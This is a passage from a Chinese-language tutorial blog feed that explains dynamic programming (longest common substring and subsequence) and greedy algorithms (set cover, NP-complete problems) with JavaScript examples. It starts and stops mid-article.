1]</code>报错的情况，什么情况下呢</p><p>如下图，这些情况下的值在你按部就班时运行会报错的，因为它缺少斜对角的值，毕竟没有<code>data[-1][-1]</code>这样的值出现</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20220222085726502.png" alt="image-20220222085726502"></p><p>怎么解决，有两种方法，第一种是每次到该计算都做一下判断，判断是否有值，我嫌太麻烦了，且影响从代码上去理解这个算法的思路，所以使用第二种，给你一个二维数组，你就会理解了，然后我就懒得解释了哈哈哈</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  [ <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> ],</span><br><span class="line">  [ <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> ],</span><br><span class="line">  [ <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span> ],</span><br><span class="line">  [ <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span> ],</span><br><span class="line">  [ <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span> ]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>在里面，我会用一个函数<code>fillDataByWordLength</code>去填充第一行的0，以及在内层循环（列）中每次一开始填充一个0</p><p>还有一点，我使用了<code>max</code>和<code>maxWord</code>在每次判断时去分别存储<strong>最长公共子串长度</strong>和<strong>最长公共子串</strong>，免得后面再在二维数组去找一个最大值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data[index1][index2] &gt; max &amp;&amp; ((max = data[index1][index2]), (maxWord1Position = index1 - <span class="number">1</span>)); <span class="comment">//最长公共子串数赋值</span></span><br></pre></td></tr></table></figure><p><code>getMaxWord</code>函数主要用作获得最长的公共子串，比如，fish和fosh最长的公共子串就为sh</p><p>然后再看看下面的代码，应该没啥问题了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 根据word长度填充数组</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fillDataByWordLength</span>(<span class="params">word, data</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> arr = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt;= word.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    arr.<span class="title function_">push</span>(data);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得最长的公共子串</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getMaxWord</span>(<span class="params">word, maxWordPosition, max</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> res = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = maxWordPosition - max + <span class="number">1</span>; i &lt;= maxWordPosition; i++) &#123;</span><br><span class="line">    res += word[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 动态规划</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">dynamicToGetCommonWords</span>(<span class="params">word1, word2</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> data = []; <span class="comment">//存储动态规划网格</span></span><br><span class="line">  <span class="keyword">let</span> max = <span class="number">0</span>; <span class="comment">//存储最长公共子串数</span></span><br><span class="line">  <span class="keyword">let</span> maxWord; <span class="comment">//存储最长公共子串</span></span><br><span class="line">  <span class="keyword">let</span> maxWord1Position; <span class="comment">//存储最长公共子串截至位置</span></span><br><span class="line">  data[<span class="number">0</span>] = <span class="title function_">fillDataByWordLength</span>(word2, <span class="number">0</span>); <span class="comment">//数组填充</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 算法核心</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> index1 = <span class="number">1</span>; index1 &lt; word1.<span class="property">length</span> + <span class="number">1</span>; index1++) &#123;</span><br><span class="line">    <span class="keyword">const</span> element1 = word1[index1 - <span class="number">1</span>]; <span class="comment">//获取当前字母</span></span><br><span class="line">    data[index1] = []; <span class="comment">//初始化数组</span></span><br><span class="line">    data[index1].<span class="title function_">push</span>(<span class="number">0</span>); <span class="comment">//默认第一位为0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> index2 = <span class="number">1</span>; index2 &lt; word2.<span class="property">length</span> + <span class="number">1</span>; index2++) &#123;</span><br><span class="line">      <span class="keyword">const</span> element2 = word2[index2 - <span class="number">1</span>]; <span class="comment">//获取当前对比字母</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (element1 == element2) &#123;</span><br><span class="line">        <span class="comment">// 若相等，则当前单元格值等于左对角线方格值加上1</span></span><br><span class="line">        data[index1][index2] = data[index1 - <span class="number">1</span>][index2 - <span class="number">1</span>] + <span class="number">1</span>; <span class="comment">//当前单元格赋值</span></span><br><span class="line">        data[index1][index2] &gt; max &amp;&amp; ((max = data[index1][index2]), (maxWord1Position = index1 - <span class="number">1</span>)); <span class="comment">//最长公共子串数赋值</span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 不相等则赋值为0</span></span><br><span class="line">        data[index1][index2] = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  maxWord = <span class="title function_">getMaxWord</span>(word1, maxWord1Position, max);</span><br><span class="line">  <span class="keyword">return</span> &#123; max, maxWord &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="运行下-1"><a href="#运行下-1" class="headerlink" title="运行下"></a>运行下</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> res = <span class="title function_">dynamicToGetCommonWords</span>(<span class="string">&#x27;fish&#x27;</span>, <span class="string">&#x27;fosh&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br></pre></td></tr></table></figure><p>结果：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20220221190426458.png" alt="image-20220221190426458"></p><h2 id="最长公共子序列"><a href="#最长公共子序列" class="headerlink" title="最长公共子序列"></a>最长公共子序列</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20220221190516948.png" alt="image-20220221190516948"></p><p>这里比较的是最长公共子串，但其实应比较最长公共子序列：两个单词中都有的序列包含的 字母数。如何计算最长公共子序列呢</p><p>计算过程如下：图很重要！！！！！！（懒得打字了）</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20220221190615957.png" alt="image-20220221190615957"></p><p>核心伪代码</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20220221190713163.png" alt="image-20220221190713163"></p><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><p>思路是和上面例子很相近的，只是判断语句不同了而已，直接看代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 根据word长度填充数组</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fillDataByWordLength</span>(<span class="params">word, data</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> arr = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt;= word.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    arr.<span class="title function_">push</span>(data);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 动态规划</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">dynamicToGetCommonWords</span>(<span class="params">word1, word2</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> data = []; <span class="comment">//存储动态规划网格</span></span><br><span class="line">  data[<span class="number">0</span>] = <span class="title function_">fillDataByWordLength</span>(word2, <span class="number">0</span>); <span class="comment">//数组填充</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 算法核心</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> index1 = <span class="number">1</span>; index1 &lt; word1.<span class="property">length</span> + <span class="number">1</span>; index1++) &#123;</span><br><span class="line">    <span class="keyword">const</span> element1 = word1[index1 - <span class="number">1</span>]; <span class="comment">//获取当前字母</span></span><br><span class="line">    data[index1] = []; <span class="comment">//初始化数组</span></span><br><span class="line">    data[index1].<span class="title function_">push</span>(<span class="number">0</span>); <span class="comment">//默认第一位为0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> index2 = <span class="number">1</span>; index2 &lt; word2.<span class="property">length</span> + <span class="number">1</span>; index2++) &#123;</span><br><span class="line">      <span class="keyword">const</span> element2 = word2[index2 - <span class="number">1</span>]; <span class="comment">//获取当前对比字母</span></span><br><span class="line">      <span class="keyword">if</span> (element1 == element2) &#123;</span><br><span class="line">        <span class="comment">// 若相等，则当前单元格值等于左对角线方格值加上1</span></span><br><span class="line">        data[index1][index2] = data[index1 - <span class="number">1</span>][index2 - <span class="number">1</span>] + <span class="number">1</span>; <span class="comment">//当前单元格赋值</span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 若不相等，则从左边或上边的邻居方格中取一个最大值</span></span><br><span class="line">        data[index1][index2] = <span class="title class_">Math</span>.<span class="title function_">max</span>(data[index1][index2 - <span class="number">1</span>], data[index1 - <span class="number">1</span>][index2]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">res</span>: data[word1.<span class="property">length</span>][word2.<span class="property">length</span>], <span class="attr">calculationMatrix</span>: data &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="运行下-2"><a href="#运行下-2" class="headerlink" title="运行下"></a>运行下</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> res = <span class="title function_">dynamicToGetCommonWords</span>(<span class="string">&#x27;fish&#x27;</span>, <span class="string">&#x27;fosh&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br></pre></td></tr></table></figure><p>结果：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20220221191104618.png" alt="image-20220221191104618"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><h3 id="动态规划的实际应用"><a href="#动态规划的实际应用" class="headerlink" title="动态规划的实际应用"></a>动态规划的实际应用</h3><ul><li>生物学家根据最长公共序列来确定DNA链的相似性，进而判断度两种动物或疾病有多相似。最长公共序列还被用来寻找多发性硬化症治疗方案。 </li><li>你使用过诸如git diff等命令吗？它们指出两个文件的差异，也是使用动态规划实现的。</li><li>前面讨论了字符串的相似程度。编辑距离（levenshtein distance）指出了两个字符串的相似程度，也是使用动态规划计算得到的。编辑距离算法的用途很多，从拼写检查到判断用户上传的资料是否是盗版，都在其中。</li><li>你使用过诸如Microsoft Word等具有断字功能的应用程序吗？它们如何确定在什么地方断字以确保行长一致呢？使用动态规划！</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li>需要在给定约束条件下优化某种指标时，动态规划很有用。</li><li>问题可分解为离散子问题时，可使用动态规划来解决。</li><li>每种动态规划解决方案都涉及网格。</li><li>单元格中的值通常就是你要优化的值。</li><li>每个单元格都是一个子问题，因此你需要考虑如何将问题分解为子问题。</li><li>没有放之四海皆准的计算动态规划解决方案的公式</li></ol>]]></content>
    
    <summary type="html">
    
      动态规划算法通常用于求解具有某种最优性质的问题
    
    </summary>
    
    
      <category term="算法" scheme="http://Dong-666.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="算法" scheme="http://Dong-666.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>贪婪算法</title>
    <link href="http://dong-666.github.io/2022/02/10/%E8%B4%AA%E5%A9%AA%E7%AE%97%E6%B3%95/"/>
    <id>http://dong-666.github.io/2022/02/10/%E8%B4%AA%E5%A9%AA%E7%AE%97%E6%B3%95/</id>
    <published>2022-02-10T06:00:00.000Z</published>
    <updated>2022-03-02T08:00:37.299Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>贪心算法（又称贪婪算法）是指，在对问题求解时，总是做出在当前看来是最好的选择。也就是说，不从整体最优上加以考虑，<strong>算法得到的是在某种意义上的局部最优解</strong></p><p>换句话说：贪婪算法就是每步都选择局部最优解，最终得到的就是全局最优解</p></blockquote><p>贪心算法也存在如下问题：</p><ol><li>不能保证解是最佳的。因为贪心算法总是从局部出发，并没从整体考虑</li><li>贪心算法一般用来解决求最大或最小解</li><li>贪心算法只能确定某些问题的可行性范围</li></ol><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h3 id="教室调度问题"><a href="#教室调度问题" class="headerlink" title="教室调度问题"></a>教室调度问题</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/02/10/%E8%B4%AA%E5%A9%AA%E7%AE%97%E6%B3%95/image-20220220150319952.png" alt="image-20220220150319952"></p><h3 id="集合覆盖问题（广播站问题）"><a href="#集合覆盖问题（广播站问题）" class="headerlink" title="集合覆盖问题（广播站问题）"></a>集合覆盖问题（广播站问题）</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/02/10/%E8%B4%AA%E5%A9%AA%E7%AE%97%E6%B3%95/image-20220220150857304.png" alt="image-20220220150857304"></p><p>这一节的算法代码会在后面放出来，我们先专注于这个算法以及其应用先，毕竟会用但不知道在哪用就跟不会用差不多嘛</p><p>通过上面两个例子，我们可以得出如简介一样的总结，贪婪算法不算最优解，但是在某些复杂的问题下我们用它可以达到非常接近最优解的解，那什么又是复杂的问题，也就是哪些问题才需要用到贪婪算法呢</p><h2 id="NP完全问题"><a href="#NP完全问题" class="headerlink" title="NP完全问题"></a>NP完全问题</h2><blockquote><p>NP完全问题的简单定义：以难解著称的问题，如旅行商问题和集合覆盖问题。很多非常 聪明的人都认为，根本不可能编写出可快速解决这些问题的算法。</p></blockquote><p>比如<a href="https://baike.baidu.com/item/%E6%97%85%E8%A1%8C%E5%95%86%E9%97%AE%E9%A2%98/7737042">旅行商问题</a>，这个<a href="https://zhuanlan.zhihu.com/p/159266077">链接</a>会讲述TSP问题以及帮你引入到贪婪算法里，懂了这一节的例子也可以不用看了</p><p>比如有这么三个城市-北京、石家庄、呼和浩特，你都想去旅游，于是有一天，你开始规划路线，那么从哪里出发，最后去哪里，你会如何规划呢</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/02/10/%E8%B4%AA%E5%A9%AA%E7%AE%97%E6%B3%95/image-20220220152241040.png" alt="image-20220220152241040"></p><p>我们先不考虑起点从哪，假设我们想先去石家庄，然后去呼和浩特，最后再到北京，这便是其中一条路线，但我们想找出最短的那条路程，比较把时间花在路上，玩的很累不是吗，那么怎么选呢，<strong>穷举法</strong>？好像很不错的样子，我们来试试</p><blockquote><p>北京-石家庄-呼和浩特</p><p>北京-呼和浩特-石家庄</p><p>石家庄-北京-呼和浩特</p><p>石家庄-呼和浩特-北京</p><p>呼和浩特-北京-石家庄</p><p>呼和浩特-石家庄-北京</p></blockquote><p>然后就是在里面挑出一条最佳路线，显然，这个方法的时间复杂度是<strong>O(n！)</strong></p><p>这可是阶乘啊，意味着啥，当你越来越富，想玩的地方越来越多，你要挑选出一条最佳路线的难度可是越来越大，原来有钱人也不是那么好的</p><p>那么这个时候我们就要选择贪婪算法了</p><h3 id="如何识别-NP-完全问题"><a href="#如何识别-NP-完全问题" class="headerlink" title="如何识别 NP 完全问题"></a>如何识别 NP 完全问题</h3><p>NP完全问题无处不在！如果能够判断出要解决的问题属于NP完全问题就好了，这样就不用去寻找完美的解决方案，而是使用近似算法即可。但要判断问题是不是NP完全问题很难，易于解决的问题和NP完全问题的差别通常很小</p><p>下面几点可作为辨别NP问题的参考</p><ol><li>元素较少时算法的运行速度非常快，但随着元素数量的增加，速度会变得非常慢。</li><li>涉及“所有组合”的问题通常是NP完全问题。</li><li>不能将问题分成小问题，必须考虑各种可能的情况。这可能是NP完全问题。</li><li>如果问题涉及序列（如旅行商问题中的城市序列）且难以解决，它可能就是NP完全问题。</li><li>如果问题涉及集合（如广播台集合）且难以解决，它可能就是NP完全问题。</li><li>如果问题可转换为集合覆盖问题或旅行商问题，那它肯定是NP完全问题。</li></ol><h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><ol><li>有个邮递员负责给20个家庭送信，需要找出经过这20个家庭的最短路径。请问这是一 个NP完全问题吗？</li><li>在一堆人中找出最大的朋友圈（即其中任何两个人都相识）是NP完全问题吗？</li><li>你要制作中国地图，需要用不同的颜色标出相邻的省。为此，你需要确定最少需要使用多少种颜色，才能确保任何两个相邻省的颜色都不同。请问这是NP完全问题吗？</li></ol><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>说完上面，我们来看看JavaScript如何实现广播站问题的贪婪算法</p><p>首先，运行该算法我们需要什么样的数据格式，一个用于存储省名的数组、一个用于表达广播站及其可以广播的省份的映射关系-散列表，在里面，我们用字母来表示广播站</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//省份缩写</span></span><br><span class="line"><span class="keyword">let</span> address = [<span class="string">&#x27;GD&#x27;</span>, <span class="string">&#x27;HN&#x27;</span>, <span class="string">&#x27;AH&#x27;</span>, <span class="string">&#x27;ZJ&#x27;</span>, <span class="string">&#x27;HN&#x27;</span>, <span class="string">&#x27;HB&#x27;</span>, <span class="string">&#x27;FJ&#x27;</span>, <span class="string">&#x27;GC&#x27;</span>, <span class="string">&#x27;JS&#x27;</span>, <span class="string">&#x27;SC&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//广播站-散列表</span></span><br><span class="line"><span class="keyword">let</span> radioStation = &#123;</span><br><span class="line">  <span class="attr">a</span>: [<span class="string">&#x27;GD&#x27;</span>, <span class="string">&#x27;HN&#x27;</span>, <span class="string">&#x27;AH&#x27;</span>],</span><br><span class="line">  <span class="attr">b</span>: [<span class="string">&#x27;AH&#x27;</span>, <span class="string">&#x27;ZJ&#x27;</span>, <span class="string">&#x27;HN&#x27;</span>, <span class="string">&#x27;SC&#x27;</span>],</span><br><span class="line">  <span class="attr">c</span>: [<span class="string">&#x27;HN&#x27;</span>, <span class="string">&#x27;AH&#x27;</span>, <span class="string">&#x27;ZJ&#x27;</span>],</span><br><span class="line">  <span class="attr">d</span>: [<span class="string">&#x27;FJ&#x27;</span>, <span class="string">&#x27;GC&#x27;</span>, <span class="string">&#x27;JS&#x27;</span>],</span><br><span class="line">  <span class="attr">e</span>: [<span class="string">&#x27;HN&#x27;</span>, <span class="string">&#x27;HB&#x27;</span>, <span class="string">&#x27;FJ&#x27;</span>, <span class="string">&#x27;GC&#x27;</span>, <span class="string">&#x27;JS&#x27;</span>],</span><br><span class="line">  <span class="attr">f</span>: [<span class="string">&#x27;HN&#x27;</span>, <span class="string">&#x27;HB&#x27;</span>, <span class="string">&#x27;FJ&#x27;</span>, <span class="string">&#x27;SC&#x27;</span>],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接着就是算法的实现了</p><p>记住我们的步骤</p><p>(1) 选出这样一个广播台，即它覆盖了<strong>最多的未覆盖</strong>省份。即便这个广播台覆盖了一些已覆盖的省，也没有关系。</p><p> (2) 重复第一步，直到覆盖了所有的州。</p><p>根据第二步，我们就应该会感觉到可能要用到迭代了</p><p>首先先不管用不用迭代，我们来分析下这个过程</p><p>最核心的一步：我们要找出<strong>最多的未覆盖</strong>省份的广播站，那么这一步如何实现</p><p>通过<strong>遍历</strong>广播站，找出广播站和所需要覆盖的省份间的<strong>交集</strong>，谁的交集包含的元素<strong>最多</strong>，就选哪个，这就是最核心的了，遍历、交集、最多，这三个名称就是算法核心代码了，如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 最大地址数的广播站所能广播的地址</span></span><br><span class="line"><span class="keyword">let</span> maxAddressStation = <span class="keyword">new</span> <span class="title class_">Set</span>();</span><br><span class="line"><span class="comment">// 最大地址数的广播站名称</span></span><br><span class="line"><span class="keyword">let</span> station = <span class="title class_">Object</span>.<span class="title function_">keys</span>(radioStation)[<span class="number">0</span>];</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 遍历radioStation，将每一项与addressCollection进行交集</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> radioStation) &#123;</span><br><span class="line">  <span class="keyword">const</span> element = radioStation[key];</span><br><span class="line">  <span class="keyword">let</span> intersection = <span class="keyword">new</span> <span class="title class_">Set</span>(address.<span class="title function_">filter</span>(<span class="function"><span class="params">i</span> =&gt;</span> <span class="keyword">new</span> <span class="title class_">Set</span>(element).<span class="title function_">has</span>(i))); <span class="comment">//取交集</span></span><br><span class="line">  <span class="comment">// 判断：若当前集合大于之前的集合，则重新赋值最大值</span></span><br><span class="line">  intersection.<span class="property">size</span> &gt; maxAddressStation.<span class="property">size</span> &amp;&amp; ((maxAddressStation = intersection), (station = key));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着遍历完第一遍，有可能会剩下其他省份还没找出广播站呢，那该如何做呢，再对剩下的省份执行上述步骤嘛，这不就要用到迭代了，代码如下，我们用<code>res</code>这个变量用于存储最终的广播站结果集合，然后记得把当前选到的广播站从下次执行的函数参数中的数据删除</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">res.<span class="title function_">push</span>(station); <span class="comment">//将广播站压入</span></span><br><span class="line">address = address.<span class="title function_">filter</span>(<span class="function"><span class="params">i</span> =&gt;</span> !maxAddressStation.<span class="title function_">has</span>(i)); <span class="comment">//取差集，即剩下需要广播的地址</span></span><br><span class="line"><span class="keyword">delete</span> radioStation[station]; <span class="comment">//排除当前已选择的广播站</span></span><br><span class="line"><span class="keyword">return</span> <span class="title function_">greedy</span>(address, radioStation, res); <span class="comment">//继续下次递归</span></span><br></pre></td></tr></table></figure><p>既然是迭代，那肯定要有终止条件，不然就无限迭代下去了，这个问题的基线条件是所有的地址都已找到所能广播的广播站了，换成代码的解释就是address长度为零</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 基线条件（递归终止条件）</span></span><br><span class="line"><span class="keyword">if</span> (address.<span class="property">length</span> == <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好了，这就是这个算法的大致代码了，等等，如果有一个地址没有任何广播站能广播到呢，出现这种情况怎么办，这种问题我们只能当作无解，毕竟没有广播站能广播到你要的地址，说明数据有问题，需求也就根本无法解决</p><p>代码上也就是，两者交集没有任何结果，如果address长度还没为0时，没有结果意味着没有广播站可以服务该地址了，所以注意该代码位置</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (maxAddressStation.<span class="property">size</span> == <span class="number">0</span>) <span class="keyword">return</span> <span class="string">&#x27;所选数据无解&#x27;</span>;</span><br></pre></td></tr></table></figure><p>全部代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 贪婪算法： 参数：所有地点（数组）、广播站（散列表）、最终结果</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">greedy</span>(<span class="params">address, radioStation, res = []</span>) &#123;</span><br><span class="line">  <span class="comment">// 最大地址数的广播站所能广播的地址</span></span><br><span class="line">  <span class="keyword">let</span> maxAddressStation = <span class="keyword">new</span> <span class="title class_">Set</span>();</span><br><span class="line">  <span class="comment">// 最大地址数的广播站名称</span></span><br><span class="line">  <span class="keyword">let</span> station = <span class="title class_">Object</span>.<span class="title function_">keys</span>(radioStation)[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 基线条件（递归终止条件）</span></span><br><span class="line">  <span class="keyword">if</span> (address.<span class="property">length</span> == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 